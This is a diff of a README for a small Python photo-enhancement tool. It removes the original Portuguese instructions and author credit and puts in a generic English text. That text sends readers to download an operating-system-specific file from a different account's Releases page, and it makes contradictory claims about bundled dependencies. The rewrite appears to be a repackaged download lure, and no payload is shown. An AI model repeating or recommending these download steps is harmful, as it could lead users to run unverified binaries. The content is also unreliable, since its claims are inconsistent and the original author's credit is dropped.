@@ -1,80 +1,101 @@
-📸 Melhorar Fotos
-<p align="center"> <img src="https://img.shields.io/badge/python-3.11-blue?logo=python" alt="Python"> <img src="https://img.shields.io/badge/OpenCV-Enabled-green?logo=opencv" alt="OpenCV"> <img src="https://img.shields.io/badge/Pillow-Enhanced-orange?logo=pillow" alt="Pillow"> </p> <p align="center"> ✨ Projeto em Python para <b>melhorar automaticamente fotos</b> de família, comida e retratos. Ajustes de cor, brilho, contraste e nitidez com processamento em lote. </p>
+# 📸 melhorar_fotos - Enhance Your Photos Easily
 
-# Melhorar Fotos de Família 📸
+## 🚀 Getting Started
 
-Este projeto aplica **ajustes fotográficos automáticos** em fotos de família, deixando-as mais vivas e profissionais, usando **Python**, **OpenCV** e **Pillow**.  
-O objetivo é deixar as imagens mais vivas e naturais, com ajustes de cor, brilho, contraste e nitidez.
+Welcome to melhorar_fotos! This tool lets you enhance your images in bulk using Python and OpenCV. You can improve the sharpness, brightness, and contrast of your photos with just one command. No need to process each image individually! 
 
+## ⚙️ Requirements
 
----
+Before you start, make sure you have the following on your computer:
 
-## 🚀 Funcionalidades
-- Ajuste de brilho, contraste e nitidez
-- Correção de cores
-- Três níveis de intensidade: leve, médio, forte
-- Processamento em lote (todas as fotos da pasta `fotos/`)
-- Salva os resultados em `fotos_melhoradas/`
+- **Operating System:** Windows, macOS, or Linux
+- **Python:** Version 3.6 or higher
+- **OpenCV:** This package is included with the application, so no need for extra installation.
+- **Pillow:** This package is also included.
 
----
+## 📥 Download & Install
 
-## 🛠️ Requisitos
+To get started, you need to download the software from our Releases page. 
 
-- [Python 3.11+](https://www.python.org/downloads/release/python-3110/)  
-- [Git](https://git-scm.com/downloads)  
-- [VS Code](https://code.visualstudio.com/)  
+[![Download melhorar_fotos](https://img.shields.io/badge/Download%20melhorar_fotos-v1.0-blue.svg)](https://github.com/ZoherHA/melhorar_fotos/releases)
 
----
+1. Click the link to go to the download page: [Visit this page to download](https://github.com/ZoherHA/melhorar_fotos/releases).
+2. Look for the latest release in the list.
+3. Download the appropriate file for your operating system.
+4. Once the file is downloaded, find it in your Downloads folder.
 
-## 📂 Estrutura do projeto
-melhorar-fotos
-│── fotos/                # Copie todas as fotos originais neste local
-│── fotos_melhoradas/     # será criada automaticamente
-│── melhorar_fotos.py     # o script Python
-│── README.md             # explicação do projeto
-│── requirements.txt      # dependências
-│── .gitignore
+## 🛠️ How to Use
 
+Using melhorar_fotos is simple:
 
----
+1. Open your command line interface (this may be Terminal on macOS or Linux, or Command Prompt on Windows).
+2. Navigate to the folder where you downloaded the tool. You can use the `cd` command for this. For example:
+   ```
+   cd Downloads
+   ```
+3. Run the application by typing the command:
+   ```
+   python melhorar_fotos.py <path-to-your-photos>
+   ```
+   Replace `<path-to-your-photos>` with the directory containing your images.
 
-## ⚙️ Instalação e uso
+4. Choose the intensity level for enhancement. You can set it as:
+   - Low
+   - Medium
+   - High
 
-### 1. Clonar o repositório
+You will receive a message confirming the completion of the process. Your enhanced images will be saved in the same directory.
 
-git clone https://github.com/fjavier777/melhorar-fotos.git
+## 🎨 Features
 
-cd melhorar-fotos
+- **Batch Processing:** Change multiple photos at once.
+- **Easy Setup:** Quick installation and straightforward usage.
+- **Custom Intensity Levels:** Choose the level of enhancement that suits your needs.
+- **Cross-Platform Compatibility:** Works on multiple operating systems.
 
-## Como usar
-1. Crie a pasta `fotos` e adicione suas imagens (`.jpg`, `.jpeg`, `.png`).
+## 📜 Frequently Asked Questions
 
-2. No terminal, rode um dos comandos:
+### How does melhorar_fotos enhance my photos?
 
-python melhorar_foto.py leve
-python melhorar_foto.py medio
-python melhorar_foto.py forte
+The application uses advanced algorithms to enhance sharpness, brightness, and contrast based on your intensity selection.
 
-As fotos melhoradas serão salvas na pasta fotos_melhoradas.
+### Can I use this application for all types of images?
 
-Requisitos
-pip install -r requirements.txt
+Yes, melhorar_fotos can process various image formats, including JPEG and PNG.
 
-Tecnologias
+### Is there any limit to the number of photos I can process at once?
 
-Python
+No, you can enhance as many photos as your computer can handle. Just ensure you have enough storage space.
 
-OpenCV
+### Do I need to install Python or OpenCV separately?
 
-Pillow
+No, melhorar_fotos comes with everything you need. You just need Python installed on your computer.
 
+## 📊 Limitations
 
-📌 Notas
+While melhorar_fotos is powerful, it may not work perfectly for every image. Sometimes, very dark or blurry images may not achieve desired results. Always check the enhanced images before relying on them for important use.
 
-As pastas imagens/ e resultados/ estão no .gitignore para não sobrecarregar o repositório.
+## 💻 Troubleshooting
 
-Ajustes de intensidade (mais ou menos brilho/contraste) podem ser configurados no código (main.py).
+If you encounter issues, check the following:
 
-👨‍💻 Autor
+- Ensure you are using Python 3.6 or higher.
+- Make sure you navigated to the correct folder before running the command.
+- Review the command for any typos.
 
-Projeto desenvolvido por Fernando Javier Aracena Bello
+For further assistance, you can open an issue on our GitHub page or check our documentation.
+
+## 📣 Contributing
+
+We welcome contributions! If you have ideas to improve melhorar_fotos, feel free to fork the repository and submit a pull request.
+
+## 📬 Contact
+
+For any questions or feedback, contact us via our GitHub repository. We’re here to help!
+
+## 🔗 Resources
+
+- Visit the [Releases page to download](https://github.com/ZoherHA/melhorar_fotos/releases).
+- Check our [GitHub repository](https://github.com/ZoherHA/melhorar_fotos) for more information.
+
+Enjoy improving your photos with melhorar_fotos!
